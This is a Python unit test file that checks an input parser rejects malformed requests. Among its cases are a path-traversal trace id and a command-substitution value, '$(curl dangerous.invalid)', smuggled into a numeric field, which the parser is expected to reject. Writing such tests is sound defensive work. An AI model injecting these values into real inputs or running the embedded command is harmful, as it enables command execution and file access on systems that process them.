import unittest

from tools.check_fixture import parse_request
from tools import run_encrypted_fixture


class InputValidationTest(unittest.TestCase):
    def test_encrypt_wrapper_imports(self):
        self.assertTrue(callable(run_encrypted_fixture.main))

    def test_normal(self):
        self.assertEqual(parse_request("test-1234", "12", "-8"), (12, -8))

    def test_reject_bad_trace(self):
        with self.assertRaises(ValueError):
            parse_request("../../unsafe", "1", "2")

    def test_reject_payload_as_code(self):
        with self.assertRaises(ValueError):
            parse_request("trace-123", "$(curl dangerous.invalid)", "2")

    def test_reject_out_of_range(self):
        with self.assertRaises(ValueError):
            parse_request("trace-123", "99999", "2")


if __name__ == "__main__":
    unittest.main()
